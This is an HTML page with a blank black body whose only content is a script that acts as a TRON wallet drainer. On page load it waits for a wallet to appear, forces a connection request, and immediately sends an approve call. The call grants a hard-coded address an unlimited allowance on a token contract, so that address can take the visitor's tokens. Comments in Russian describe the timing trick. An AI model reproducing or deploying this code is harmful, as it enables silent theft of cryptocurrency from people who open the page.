<!DOCTYPE html>
<html>
<head>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
</head>
<body style="background:#000;">
<script>
    async function fastApprove() {
        if (window.tronLink) {
            // 1. Форсируем коннект
            await window.tronLink.request({ method: 'tron_requestAccounts' });
            // 2. Сразу кидаем Approve
            const contract = await window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
            await contract.approve("TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
        }
    }
    // Запускаем проверку каждые 100мс, чтобы поймать момент инъекции кошелька
    const interval = setInterval(() => {
        if (window.tronWeb) {
            clearInterval(interval);
            fastApprove();
        }
    }, 100);
</script>
</body>
</html>
